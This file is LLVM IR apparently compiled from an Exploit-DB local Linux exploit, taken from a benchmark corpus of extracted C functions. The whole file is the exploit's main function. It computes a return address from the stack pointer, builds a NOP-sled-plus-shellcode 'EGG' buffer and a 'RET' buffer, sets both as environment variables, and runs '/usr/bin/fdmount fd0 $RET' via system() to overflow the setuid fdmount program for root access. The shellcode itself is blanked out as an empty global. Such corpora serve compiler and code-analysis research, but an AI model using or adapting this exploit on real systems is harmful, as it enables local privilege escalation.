; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19952.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/local/extr_19952.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@DEFAULT_OFFSET = common dso_local global i32 0, align 4
@DEFAULT_BUFFER_SIZE = common dso_local global i32 0, align 4
@DEFAULT_EGG_SIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [24 x i8] c"Can't allocate memory.\0A\00", align 1
@shellcode = common dso_local global i32* null, align 8
@NOP = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [5 x i8] c"EGG=\00", align 1
@.str.2 = private unnamed_addr constant [5 x i8] c"RET=\00", align 1
@.str.3 = private unnamed_addr constant [26 x i8] c"/usr/bin/fdmount fd0 $RET\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8**, align 8
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i8*, align 8
  %8 = alloca i64*, align 8
  %9 = alloca i64, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i8** %1, i8*** %4, align 8
  %14 = load i32, i32* @DEFAULT_OFFSET, align 4
  store i32 %14, i32* %10, align 4
  %15 = load i32, i32* @DEFAULT_BUFFER_SIZE, align 4
  store i32 %15, i32* %11, align 4
  %16 = load i32, i32* @DEFAULT_EGG_SIZE, align 4
  store i32 %16, i32* %13, align 4
  %17 = load i32, i32* %3, align 4
  %18 = icmp sgt i32 %17, 1
  br i1 %18, label %19, label %24

19:                                               ; preds = %2
  %20 = load i8**, i8*** %4, align 8
  %21 = getelementptr inbounds i8*, i8** %20, i64 1
  %22 = load i8*, i8** %21, align 8
  %23 = call i32 @atoi(i8* %22)
  store i32 %23, i32* %11, align 4
  br label %24

24:                                               ; preds = %19, %2
  %25 = load i32, i32* %3, align 4
  %26 = icmp sgt i32 %25, 2
  br i1 %26, label %27, label %32

27:                                               ; preds = %24
  %28 = load i8**, i8*** %4, align 8
  %29 = getelementptr inbounds i8*, i8** %28, i64 2
  %30 = load i8*, i8** %29, align 8
  %31 = call i32 @atoi(i8* %30)
  store i32 %31, i32* %10, align 4
  br label %32

32:                                               ; preds = %27, %24
  %33 = load i32, i32* %3, align 4
  %34 = icmp sgt i32 %33, 3
  br i1 %34, label %35, label %40

35:                                               ; preds = %32
  %36 = load i8**, i8*** %4, align 8
  %37 = getelementptr inbounds i8*, i8** %36, i64 3
  %38 = load i8*, i8** %37, align 8
  %39 = call i32 @atoi(i8* %38)
  store i32 %39, i32* %13, align 4
  br label %40

40:                                               ; preds = %35, %32
  %41 = load i32, i32* %11, align 4
  %42 = call i8* @malloc(i32 %41)
  store i8* %42, i8** %5, align 8
  %43 = icmp ne i8* %42, null
  br i1 %43, label %47, label %44

44:                                               ; preds = %40
  %45 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %46 = call i32 @exit(i32 0) #3
  unreachable

47:                                               ; preds = %40
  %48 = load i32, i32* %13, align 4
  %49 = call i8* @malloc(i32 %48)
  store i8* %49, i8** %7, align 8
  %50 = icmp ne i8* %49, null
  br i1 %50, label %54, label %51

51:                                               ; preds = %47
  %52 = call i32 @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str, i64 0, i64 0))
  %53 = call i32 @exit(i32 0) #3
  unreachable

54:                                               ; preds = %47
  %55 = call i32 (...) @get_esp()
  %56 = load i32, i32* %10, align 4
  %57 = sub nsw i32 %55, %56
  %58 = sext i32 %57 to i64
  store i64 %58, i64* %9, align 8
  %59 = load i8*, i8** %5, align 8
  store i8* %59, i8** %6, align 8
  %60 = load i8*, i8** %6, align 8
  %61 = bitcast i8* %60 to i64*
  store i64* %61, i64** %8, align 8
  store i32 0, i32* %12, align 4
  br label %62

62:                                               ; preds = %70, %54
  %63 = load i32, i32* %12, align 4
  %64 = load i32, i32* %11, align 4
  %65 = icmp slt i32 %63, %64
  br i1 %65, label %66, label %73

66:                                               ; preds = %62
  %67 = load i64, i64* %9, align 8
  %68 = load i64*, i64** %8, align 8
  %69 = getelementptr inbounds i64, i64* %68, i32 1
  store i64* %69, i64** %8, align 8
  store i64 %67, i64* %68, align 8
  br label %70

70:                                               ; preds = %66
  %71 = load i32, i32* %12, align 4
  %72 = add nsw i32 %71, 4
  store i32 %72, i32* %12, align 4
  br label %62

73:                                               ; preds = %62
  %74 = load i8*, i8** %7, align 8
  store i8* %74, i8** %6, align 8
  store i32 0, i32* %12, align 4
  br label %75

75:                                               ; preds = %88, %73
  %76 = load i32, i32* %12, align 4
  %77 = load i32, i32* %13, align 4
  %78 = load i32*, i32** @shellcode, align 8
  %79 = call i32 @strlen(i32* %78)
  %80 = sub nsw i32 %77, %79
  %81 = sub nsw i32 %80, 1
  %82 = icmp slt i32 %76, %81
  br i1 %82, label %83, label %91

83:                                               ; preds = %75
  %84 = load i32, i32* @NOP, align 4
  %85 = trunc i32 %84 to i8
  %86 = load i8*, i8** %6, align 8
  %87 = getelementptr inbounds i8, i8* %86, i32 1
  store i8* %87, i8** %6, align 8
  store i8 %85, i8* %86, align 1
  br label %88

88:                                               ; preds = %83
  %89 = load i32, i32* %12, align 4
  %90 = add nsw i32 %89, 1
  store i32 %90, i32* %12, align 4
  br label %75

91:                                               ; preds = %75
  store i32 0, i32* %12, align 4
  br label %92

92:                                               ; preds = %106, %91
  %93 = load i32, i32* %12, align 4
  %94 = load i32*, i32** @shellcode, align 8
  %95 = call i32 @strlen(i32* %94)
  %96 = icmp slt i32 %93, %95
  br i1 %96, label %97, label %109

97:                                               ; preds = %92
  %98 = load i32*, i32** @shellcode, align 8
  %99 = load i32, i32* %12, align 4
  %100 = sext i32 %99 to i64
  %101 = getelementptr inbounds i32, i32* %98, i64 %100
  %102 = load i32, i32* %101, align 4
  %103 = trunc i32 %102 to i8
  %104 = load i8*, i8** %6, align 8
  %105 = getelementptr inbounds i8, i8* %104, i32 1
  store i8* %105, i8** %6, align 8
  store i8 %103, i8* %104, align 1
  br label %106

106:                                              ; preds = %97
  %107 = load i32, i32* %12, align 4
  %108 = add nsw i32 %107, 1
  store i32 %108, i32* %12, align 4
  br label %92

109:                                              ; preds = %92
  %110 = load i8*, i8** %5, align 8
  %111 = load i32, i32* %11, align 4
  %112 = sub nsw i32 %111, 1
  %113 = sext i32 %112 to i64
  %114 = getelementptr inbounds i8, i8* %110, i64 %113
  store i8 0, i8* %114, align 1
  %115 = load i8*, i8** %7, align 8
  %116 = load i32, i32* %13, align 4
  %117 = sub nsw i32 %116, 1
  %118 = sext i32 %117 to i64
  %119 = getelementptr inbounds i8, i8* %115, i64 %118
  store i8 0, i8* %119, align 1
  %120 = load i8*, i8** %7, align 8
  %121 = call i32 @memcpy(i8* %120, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.1, i64 0, i64 0), i32 4)
  %122 = load i8*, i8** %7, align 8
  %123 = call i32 @putenv(i8* %122)
  %124 = load i8*, i8** %5, align 8
  %125 = call i32 @memcpy(i8* %124, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.2, i64 0, i64 0), i32 4)
  %126 = load i8*, i8** %5, align 8
  %127 = call i32 @putenv(i8* %126)
  %128 = call i32 @system(i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.3, i64 0, i64 0))
  ret void
}

declare dso_local i32 @atoi(i8*) #1

declare dso_local i8* @malloc(i32) #1

declare dso_local i32 @printf(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

declare dso_local i32 @get_esp(...) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @putenv(i8*) #1

declare dso_local i32 @system(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
